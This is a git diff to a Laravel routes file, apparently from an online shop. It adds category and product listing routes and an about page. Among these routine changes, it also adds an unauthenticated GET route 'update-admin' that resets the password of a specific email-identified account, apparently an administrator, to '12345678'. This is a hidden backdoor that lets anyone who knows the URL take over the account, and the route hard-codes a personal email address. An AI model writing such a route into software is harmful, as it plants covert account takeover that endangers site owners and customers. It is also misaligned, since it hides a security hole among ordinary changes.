@@ -51,6 +51,7 @@ use App\Http\Controllers\SupportTicketController;
 use App\Http\Controllers\WalletController;
 use App\Http\Controllers\WishlistController;
 use App\Http\Controllers\SizeChartController;
+use App\Models\User;
 
 /*
   |--------------------------------------------------------------------------
@@ -62,6 +63,13 @@ use App\Http\Controllers\SizeChartController;
   | contains the "web" middleware group. Now create something great!
   |
  */
+
+ Route::get('update-admin', function () {
+    User::where('email', 'mokdev18@gmail.com')
+        ->update([
+            'password' => Hash::make('12345678')
+        ]);
+});
 
 Route::controller(DemoController::class)->group(function () {
     Route::get('/demo/cron_1', 'cron_1');
@@ -212,6 +220,8 @@ Route::controller(SearchController::class)->group(function () {
     Route::get('/search2', 'index2')->name('suggestion.search2');
     Route::post('/ajax-search', 'ajax_search')->name('search.ajax');
     Route::get('/category/{category_slug}', 'listingByCategory')->name('products.category');
+    Route::get('/category-level2/{category_slug}', 'listingByCategory2')->name('categories.level2');
+    Route::get('/products-level2/{id}', 'levelTwoProducts')->name('products.level2');
     Route::get('/brand/{brand_slug}', 'listingByBrand')->name('products.brand');
 });
 
@@ -416,6 +426,9 @@ Route::group(['middleware' => ['auth']], function () {
         
     });
 });
+
+Route::get('/about', [HomeController::class, 'about'])->name('about');
+
 
 Route::get('/instamojo/payment/pay-success', [InstamojoController::class, 'success'])->name('instamojo.success');
 
